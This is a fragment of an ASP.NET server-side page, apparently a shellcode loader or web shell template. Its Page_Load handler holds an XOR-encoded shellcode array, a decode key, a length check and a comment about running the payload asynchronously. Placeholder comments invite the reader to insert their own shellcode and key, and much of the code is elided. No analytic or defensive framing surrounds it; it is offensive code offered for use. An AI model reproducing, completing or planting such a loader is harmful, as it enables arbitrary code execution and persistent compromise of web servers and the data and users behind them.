...
<script runat="server">
    ...
    protected void Page_Load(object sender, EventArgs e) {
        try {
            // XOR-encoded shellcode (replace with your actual encoded shellcode)
            byte[] encodedShellcode = new byte[] {
                ...
                // ... add your complete encoded shellcode here
            };

            // XOR key for decoding
            byte xorKey = 0xAA; // Change this to your XOR key
            ...
            if (shellcode.Length == 0) {
                Response.Write("Invalid shellcode");
                return;
            }
            ...
            // Don't wait for thread completion (asynchronous execution)
